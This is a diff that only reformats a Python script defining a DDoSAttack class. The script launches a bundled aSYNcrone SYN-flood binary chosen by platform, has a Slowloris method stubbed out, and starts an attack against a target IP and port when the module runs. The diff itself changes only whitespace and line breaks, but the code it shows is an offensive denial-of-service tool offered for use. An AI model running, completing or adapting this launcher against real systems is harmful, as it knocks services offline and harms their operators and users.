@@ -14,7 +14,9 @@ logging.basicConfig(
 
 
 class DDoSAttack:
-    def __init__(self, target_ip, target_port, num_connections, attack_type="aSYNcrone"):
+    def __init__(
+        self, target_ip, target_port, num_connections, attack_type="aSYNcrone"
+    ):
         self.target_ip = target_ip
         self.target_port = target_port
         self.num_connections = num_connections
@@ -37,11 +39,11 @@ class DDoSAttack:
             logging.error(f"Unknown attack type: {self.attack_type}")
 
     def aSYNcrone_attack(self):
-        if sys.platform == "darwin" and platform.machine() == "arm64": # noqa
+        if sys.platform == "darwin" and platform.machine() == "arm64":  # noqa
             path_to_executable = os.path.join(
                 os.path.dirname(__file__), "aSYNcrone/aSYNcronemacARM"
             )
-        elif sys.platform == "darwin": # noqa
+        elif sys.platform == "darwin":  # noqa
             path_to_executable = os.path.join(
                 os.path.dirname(__file__), "aSYNcrone/aSYNcronemac"
             )
@@ -68,7 +70,6 @@ class DDoSAttack:
             logging.error(f"Error while running aSYNcrone: {e}")
             return
 
-
     def slowloris_attack(self):
         # TODO: Implement the Slowloris attack here
         raise NotImplementedError
@@ -87,4 +88,3 @@ num_connections = 1
 attack = DDoSAttack(target_ip, target_port, num_connections, "aSYNcrone")
 attack.create_connection()
 attack.wait_for_threads()
-
